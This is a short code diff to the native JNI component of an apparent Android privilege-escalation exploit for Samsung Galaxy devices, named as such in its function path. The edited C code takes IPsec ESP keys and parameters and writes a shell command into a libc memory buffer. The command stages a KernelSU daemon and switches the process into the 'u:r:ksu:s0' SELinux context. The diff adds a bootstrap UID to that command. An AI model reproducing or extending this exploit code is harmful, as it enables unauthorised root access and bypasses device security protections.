@@ -564,7 +564,7 @@ Java_dirtyfrag_galaxy_exploit_ExploitNative_nativeRunAll(JNIEnv *env, jclass clz
                                                jint encapPort, jint spi,
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
-                                               jint senderPort, jstring jksudPath,
+                                               jint senderPort, jstring jksudPath, jint bootstrapUid,
                                                jstring jmanagerPkg,
                                                jboolean softReboot) {
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
@@ -619,8 +619,10 @@ Java_dirtyfrag_galaxy_exploit_ExploitNative_nativeRunAll(JNIEnv *env, jclass clz
                         char cmd[512];
                         snprintf(cmd, sizeof(cmd),
                                  "exec >/dev/null 2>&1; /system/bin/logcat late-load "
-                                 "--package-name %s --stage-from /data/system/ksud --ro-partitions & sleep 8; "
-                                 "echo u:r:ksu:s0 > /proc/self/attr/current", pkg);
+                                 "--package-name %s --bootstrap-uid %d "
+                                 "--stage-from /data/system/ksud --ro-partitions & sleep 8; "
+                                 "echo u:r:ksu:s0 > /proc/self/attr/current", pkg,
+                                 (int)bootstrapUid);
                         size_t n = strlen(cmd) + 1;
                         if (n > 480) n = 480;
                         memcpy(libc_data + libc_cmd_buf_off, cmd, n);
